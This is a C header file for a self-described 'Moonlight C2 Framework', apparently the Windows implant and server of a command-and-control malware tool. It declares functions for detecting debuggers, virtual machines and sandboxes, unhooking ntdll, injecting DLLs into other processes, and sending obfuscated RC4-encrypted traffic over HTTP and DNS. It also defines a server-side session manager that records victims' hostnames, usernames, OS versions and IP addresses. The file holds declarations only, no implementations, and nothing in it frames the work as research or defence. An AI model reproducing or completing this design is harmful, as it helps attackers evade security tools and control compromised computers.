/*
 * Moonlight C2 Framework - 통합 헤더
 * 모든 주요 기능의 함수 선언
 */

#ifndef MOONLIGHT_H
#define MOONLIGHT_H

#include <windows.h>
#include <winsock2.h>

// ============================================================================
// Stealth 모듈 (stealth.c)
// ============================================================================
int check_debugger();
void hide_from_debugger();
int check_vm();
int check_sandbox();
int unhook_ntdll();
int inject_dll(DWORD processId, const char* dllPath);
HMODULE get_kernel32_base();
HMODULE get_ntdll_base();

// ============================================================================
// Network 모듈 (network.c)
// ============================================================================
typedef struct {
    unsigned char S[256];
    int i;
    int j;
} RC4_Context;

void xor_encrypt(unsigned char* data, size_t length, 
                 const unsigned char* key, size_t key_length);
void rc4_init(RC4_Context* ctx, const unsigned char* key, size_t key_length);
void rc4_crypt(RC4_Context* ctx, unsigned char* data, size_t length);
int socket_send_encrypted(SOCKET sock, const unsigned char* data, size_t length, 
                         RC4_Context* ctx);
int socket_recv_encrypted(SOCKET sock, unsigned char* buffer, size_t buffer_size, 
                         RC4_Context* ctx);
int http_request(const char* host, int port, const char* path, 
                char* response, size_t response_size);
int dns_query(const char* domain, char* ip_address, size_t ip_size);
unsigned int fast_checksum(const unsigned char* data, size_t length);
void obfuscate_string(char* str, size_t length);
void deobfuscate_string(char* str, size_t length);
int base64_encode(const unsigned char* input, size_t input_length, 
                 char* output, size_t output_size);
void secure_memcpy(void* dest, const void* src, size_t n);
void secure_zero_memory(void* ptr, size_t size);

// ============================================================================
// Server Backend (server_backend.c)
// ============================================================================
typedef struct {
    SOCKET socket;
    struct sockaddr_in address;
    char hostname[256];
    char username[256];
    char os_version[256];
    char ip_address[64];
    int session_id;
    BOOL active;
    time_t last_heartbeat;
    DWORD process_id;
    RC4_Context crypto_context;
} ClientSession;

typedef struct {
    ClientSession clients[100];
    int client_count;
    CRITICAL_SECTION lock;
} SessionManager;

void InitializeSessionManager(SessionManager* mgr);
void CleanupSessionManager(SessionManager* mgr);
int AddClientSession(SessionManager* mgr, SOCKET sock, struct sockaddr_in addr);
void RemoveClientSession(SessionManager* mgr, int session_id);
ClientSession* GetClientSession(SessionManager* mgr, int session_id);
void SendToClient(SessionManager* mgr, int session_id, const char* data);
void BroadcastToAllClients(SessionManager* mgr, const char* data);

#endif // MOONLIGHT_H
